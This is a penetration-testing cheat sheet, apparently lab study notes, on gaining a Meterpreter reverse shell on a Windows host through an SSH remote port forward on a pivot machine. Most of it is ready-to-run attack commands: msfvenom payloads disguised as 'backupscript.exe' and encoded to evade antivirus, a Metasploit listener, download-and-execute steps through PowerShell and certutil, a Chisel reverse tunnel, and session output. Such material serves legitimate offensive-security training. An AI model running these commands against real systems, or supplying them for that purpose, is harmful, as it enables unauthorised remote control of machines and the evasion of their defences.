# SSH Remote/Reverse Port Forwarding Quick Reference

## What is Remote Port Forwarding?

**Remote Port Forwarding (-R)** = Forward remote server port back to your local machine

**Use Case**: Get reverse shell from target that can't reach you directly

## Problem Scenario

```
Attack Host (10.10.15.5)
    ↓ Can SSH to →
Pivot Host (10.129.15.50 + 172.16.5.129)
    ↓ Can access →
Windows Target (172.16.5.19)
    ❌ Cannot reach Attack Host directly
```

**Issue**: Windows target can't connect back to attack host for reverse shell

**Solution**: Use pivot host to forward connections

## Attack Flow

```
1. Create payload pointing to pivot host
2. Setup metasploit listener on attack host
3. SSH reverse port forward (pivot → attack host)
4. Transfer payload to Windows target
5. Execute payload
6. Get reverse shell via pivot
```

## Step-by-Step Attack

### Step 1: Create Payload

```bash
# Create Meterpreter payload
msfvenom -p windows/x64/meterpreter/reverse_https \
         LHOST=172.16.5.129 \
         LPORT=8080 \
         -f exe \
         -o backupscript.exe

# LHOST = Pivot host IP (internal interface)
# LPORT = Port on pivot host
```

**Other Payload Options**:
```bash
# TCP payload
msfvenom -p windows/x64/meterpreter/reverse_tcp \
         LHOST=172.16.5.129 LPORT=8080 \
         -f exe -o payload.exe

# Encoded payload
msfvenom -p windows/x64/meterpreter/reverse_https \
         LHOST=172.16.5.129 LPORT=8080 \
         -f exe -e x86/shikata_ga_nai -i 3 \
         -o encoded.exe
```

### Step 2: Setup Metasploit Listener

```bash
msfconsole

use exploit/multi/handler
set payload windows/x64/meterpreter/reverse_https
set LHOST 0.0.0.0
set LPORT 8000
run
```

**Listen on 0.0.0.0**: Accepts connections from anywhere (including SSH tunnel)

### Step 3: Transfer Payload to Pivot

```bash
# Using SCP
scp backupscript.exe ubuntu@10.129.15.50:~/

# Using rsync
rsync -avz backupscript.exe ubuntu@10.129.15.50:~/

# Verify transfer
ssh ubuntu@10.129.15.50 "ls -la ~/backupscript.exe"
```

### Step 4: Host Payload on Pivot

```bash
# SSH into pivot
ssh ubuntu@10.129.15.50

# Start HTTP server
python3 -m http.server 8123

# Or specific directory
cd ~
python3 -m http.server 8123
```

### Step 5: Setup SSH Remote Port Forward

```bash
# Syntax
ssh -R <PIVOT_INTERNAL_IP>:8080:0.0.0.0:8000 ubuntu@<PIVOT_EXTERNAL_IP> -vN

# Example
ssh -R 172.16.5.129:8080:0.0.0.0:8000 ubuntu@10.129.15.50 -vN
```

**Flags**:
- `-R` = Remote port forward
- `172.16.5.129:8080` = Pivot listens here
- `0.0.0.0:8000` = Forward to attack host
- `-v` = Verbose (see connection logs)
- `-N` = No command execution

### Step 6: Download Payload on Windows

#### PowerShell
```powershell
# Download payload
Invoke-WebRequest -Uri "http://172.16.5.129:8123/backupscript.exe" -OutFile "C:\backupscript.exe"

# Or short version
iwr http://172.16.5.129:8123/backupscript.exe -OutFile C:\backupscript.exe
```

#### certutil
```cmd
certutil -urlcache -f http://172.16.5.129:8123/backupscript.exe C:\backupscript.exe
```

#### Browser
```
Navigate to: http://172.16.5.129:8123/backupscript.exe
Save file
```

### Step 7: Execute Payload

```cmd
# Run payload
C:\backupscript.exe

# Or background execution
start /b C:\backupscript.exe
```

### Step 8: Verify Connection

**On attack host (Metasploit)**:
```
[*] Meterpreter session 1 opened (127.0.0.1:8000 -> 127.0.0.1)

meterpreter > sysinfo
meterpreter > getuid
```

**On pivot host (SSH verbose)**:
```
debug1: client_request_forwarded_tcpip: listen 172.16.5.129 port 8080
debug1: originator 172.16.5.19 port 61355
debug1: connect_next: host 0.0.0.0 ([0.0.0.0]:8000)
```

## SSH Remote Port Forward Syntax

### Basic Format
```bash
ssh -R [REMOTE_IP:]REMOTE_PORT:LOCAL_IP:LOCAL_PORT user@remote_host
```

### Examples
```bash
# Forward pivot:8080 → attack:8000
ssh -R 172.16.5.129:8080:0.0.0.0:8000 ubuntu@10.129.15.50 -vN

# Forward pivot:443 → attack:443
ssh -R 172.16.5.129:443:0.0.0.0:443 user@pivot -vN

# Forward pivot:4444 → attack:4444
ssh -R 172.16.5.129:4444:127.0.0.1:4444 user@pivot -vN
```

### With Background
```bash
# Run in background
ssh -R 172.16.5.129:8080:0.0.0.0:8000 ubuntu@10.129.15.50 -vN -f

# Kill later
ps aux | grep "ssh -R"
kill PID
```

## Network Flow Diagram

```
Windows Target (172.16.5.19)
    ↓
Executes backupscript.exe
    ↓
Connects to 172.16.5.129:8080 (Pivot internal IP)
    ↓
Pivot forwards via SSH tunnel
    ↓
0.0.0.0:8000 on Attack Host
    ↓
Metasploit handler receives connection
    ↓
Meterpreter session established
```

## Complete Example

```bash
# ATTACK HOST
# 1. Create payload
msfvenom -p windows/x64/meterpreter/reverse_https \
         LHOST=172.16.5.129 LPORT=8080 \
         -f exe -o payload.exe

# 2. Transfer to pivot
scp payload.exe ubuntu@10.129.15.50:~/

# 3. Start metasploit listener
msfconsole -q -x "use exploit/multi/handler; \
  set payload windows/x64/meterpreter/reverse_https; \
  set LHOST 0.0.0.0; \
  set LPORT 8000; \
  run"

# PIVOT HOST (in another terminal)
# 4. Start web server
ssh ubuntu@10.129.15.50
python3 -m http.server 8123

# ATTACK HOST (in another terminal)
# 5. Setup reverse port forward
ssh -R 172.16.5.129:8080:0.0.0.0:8000 ubuntu@10.129.15.50 -vN

# WINDOWS TARGET
# 6. Download and execute
Invoke-WebRequest -Uri "http://172.16.5.129:8123/payload.exe" -OutFile "C:\payload.exe"
C:\payload.exe

# ATTACK HOST
# 7. Receive meterpreter session
meterpreter > sysinfo
```

## Port Forwarding Comparison

| Type | Flag | Direction | Use Case |
|------|------|-----------|----------|
| **Local** | `-L` | Remote → Local | Access remote service |
| **Dynamic** | `-D` | Both ways | SOCKS proxy/pivot |
| **Remote** | `-R` | Local → Remote | Reverse shell/upload |

## Common Metasploit Payloads

```bash
# HTTPS (better for evasion)
windows/x64/meterpreter/reverse_https

# TCP (simpler)
windows/x64/meterpreter/reverse_tcp

# Bind shell (if reverse not possible)
windows/x64/meterpreter/bind_tcp

# Stageless (larger but single payload)
windows/x64/meterpreter_reverse_https
```

## Troubleshooting

### Issue 1: No Connection Received
```bash
# Check SSH tunnel is active
ps aux | grep "ssh -R"

# Check pivot is listening
ssh ubuntu@10.129.15.50
netstat -tlnp | grep 8080

# Check metasploit listening
netstat -tlnp | grep 8000
```

### Issue 2: Permission Denied
```bash
# Pivot might not allow remote forwards
# Edit /etc/ssh/sshd_config on pivot:
GatewayPorts yes

# Restart SSH
sudo systemctl restart sshd
```

### Issue 3: Connection Timeout
```bash
# Check firewall on pivot
sudo iptables -L

# Check Windows can reach pivot
# On Windows:
Test-NetConnection -ComputerName 172.16.5.129 -Port 8080
```

### Issue 4: Payload Not Executing
```bash
# Check antivirus
# On Windows:
Get-MpPreference | Select-Object DisableRealtimeMonitoring

# Encode payload more
msfvenom -p windows/x64/meterpreter/reverse_https \
         LHOST=172.16.5.129 LPORT=8080 \
         -f exe -e x86/shikata_ga_nai -i 5 \
         -o encoded.exe
```

## Verification Commands

### On Attack Host
```bash
# Check metasploit listener
netstat -tlnp | grep 8000

# Check SSH tunnel
ps aux | grep "ssh -R"
```

### On Pivot Host
```bash
# Check listening port
netstat -tlnp | grep 8080

# Check web server
netstat -tlnp | grep 8123

# Check SSH connections
ss -tnp | grep ssh
```

### On Windows Target
```powershell
# Check connectivity to pivot
Test-NetConnection 172.16.5.129 -Port 8080
Test-NetConnection 172.16.5.129 -Port 8123

# Check if payload downloaded
Get-Item C:\backupscript.exe
```

## Alternative: Chisel (if SSH not available)

### On Attack Host
```bash
# Download chisel
wget https://github.com/jpillora/chisel/releases/download/v1.8.1/chisel_1.8.1_linux_amd64.gz
gunzip chisel_1.8.1_linux_amd64.gz
chmod +x chisel_1.8.1_linux_amd64

# Start server
./chisel server --reverse --port 9001
```

### On Pivot Host
```bash
# Connect back
./chisel client ATTACK_IP:9001 R:8080:0.0.0.0:8000
```

## Key Points

🔴 **Remember**:
- Payload LHOST = Pivot internal IP
- Payload LPORT = Port on pivot
- Listener LHOST = 0.0.0.0 (or specific IP)
- Listener LPORT = Different from payload port
- Use `-vN` for verbose non-interactive SSH

🎯 **Port Mapping**:
```
Windows → 172.16.5.129:8080 (Pivot)
          ↓ SSH tunnel
          0.0.0.0:8000 (Attack Host)
```

## Quick Commands

```bash
# Create payload
msfvenom -p windows/x64/meterpreter/reverse_https LHOST=PIVOT_IP LPORT=8080 -f exe -o payload.exe

# Transfer
scp payload.exe user@pivot:~/

# Start listener
msfconsole -q -x "use multi/handler; set payload windows/x64/meterpreter/reverse_https; set LHOST 0.0.0.0; set LPORT 8000; run"

# Remote forward
ssh -R PIVOT_INTERNAL_IP:8080:0.0.0.0:8000 user@PIVOT_EXTERNAL_IP -vN
```
